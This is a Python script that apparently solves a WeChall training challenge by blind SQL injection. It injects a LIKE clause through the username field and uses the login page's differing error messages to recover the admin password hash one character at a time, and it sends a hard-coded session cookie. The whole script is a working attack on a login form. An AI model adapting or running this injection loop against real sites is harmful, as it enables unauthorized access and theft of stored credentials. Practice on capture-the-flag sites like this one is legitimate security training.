import requests
import json

target = 'http://www.wechall.net/challenge/training/mysql/auth_bypass2/index.php'

chars = '0123456789abcdefghijklmnopqrstuvwxyz'
err_user = 'This username is unknown.'
err_pass = 'Your password is wrong!'

pass_md5 = ''

for i in range(32):
    print(i)
    for c in chars:
        #print(c)
        username = "admin' AND password LIKE '"+pass_md5+c+"%'"
        password = "ass"
        data = {"username" : username, "password":password}
        r = requests.get(target, data=data, cookies={'WC':'9133902-21232-KoNdWkiuKDOnllQA'})
        print(r.content)
        if r.content.find(err_pass) != -1:
            pass_md5 += c
            print(pass_md5)
            break


